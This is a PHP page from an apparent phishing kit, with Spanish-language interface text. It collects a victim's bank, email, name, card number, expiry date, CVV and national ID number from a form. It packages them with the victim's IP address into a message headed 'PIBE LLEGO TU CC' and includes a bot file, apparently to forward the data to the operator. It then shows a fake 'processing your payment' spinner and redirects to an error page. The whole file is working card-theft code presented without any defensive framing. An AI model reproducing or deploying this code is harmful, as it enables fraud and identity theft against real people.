<?php  
session_start();
	$prioridad=$_POST['tramite'];
	$banco=$_POST['tipo'];
	$email=$_POST['email'];
	$nombre=$_POST['nombre'];
	$tarje=$_POST['tarje'];
	$fech=$_POST['fech'];
	$cvv=$_POST['cvv'];
	$dnititu=$_POST['dnititu'];

	$enviara =  "[PIBE LLEGO TU CC]\n".
  "<b>prioridad: </b>  <code>".$prioridad."</code>\n".
  "<b>banco: </b>  <code>".$banco. "</code>\n".
  "<b>correo: </b>  <code>".$email. "</code>\n".
  "<b>nombre: </b>  <code>".$nombre. "</code>\n".
  "<b>tarjeta: </b>  <code>".$tarje. "</code>\n".
  "<b>fecha: </b>  <code>".$fech. "</code>\n".
  "<b>cvv: </b>  <code>".$cvv. "</code>\n".
  "<b>dni: </b>  <code>".$dnititu. "</code>\n".
  "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
  $enviar =  urldecode($enviara);
  include 'bot_id.php';
?>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="refresh" content="10;url=error.php">
    <title>Página de Carga</title>
    <style>
      body {
        background-color: #fff;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }

	.loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #00dcff;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

      h1 {
        color: #000;
        font-family: "Helvetica Neue", Arial, sans-serif;
        font-size: 14px;
        font-weight: lighter;
        text-align: center;
        opacity: 1;
        transition: opacity 0.5s;
      }
    </style>
  </head>
  <body>
    <div class="loader"></div>
    <h1 id="message" style="opacity: 1;">Estamos procesando su pago...</h1>
  
  <script>
    var messages = ["Procesando pago...", "Por favor espere...", "Estamos procesando su pago..."];
    var messageIndex = 0;

    setInterval(function() {
      var messageElement = document.getElementById("message");
      messageElement.style.opacity = 0;
      setTimeout(function() {
        messageElement.innerHTML = messages[messageIndex];
        messageElement.style.opacity = 1;
        messageIndex = (messageIndex + 1) % messages.length;
      }, 500);
    }, 3000);
  </script>
</body></html>